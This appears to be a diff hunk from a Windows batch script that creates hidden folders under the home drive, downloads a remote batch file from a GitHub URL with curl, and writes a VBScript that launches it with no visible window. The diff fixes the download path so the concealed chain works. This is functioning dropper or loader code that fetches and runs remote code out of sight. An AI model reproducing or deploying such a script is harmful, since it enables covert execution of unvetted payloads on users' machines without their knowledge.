@@ -3,7 +3,7 @@ mkdir %homedrive%\Akuma
 attrib +h %homedrive%\Akuma
 mkdir  %homedrive%\ShiniGami
 attrib +h  %homedrive%\ShiniGami
-curl -L https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat > %homedrive%\ShiniGami
+curl -L https://raw.githubusercontent.com/l-urk/Akuma/main/Akuma.bat > %homedrive%\ShiniGami\Akuma.bat
 del %homedrive%\Akuma\死神.vbs
 echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\死神.vbs
 echo objShell.Run " %homedrive%\ShiniGami\Akuma.bat", 0, False >> %homedrive%\Akuma\死神.vbs
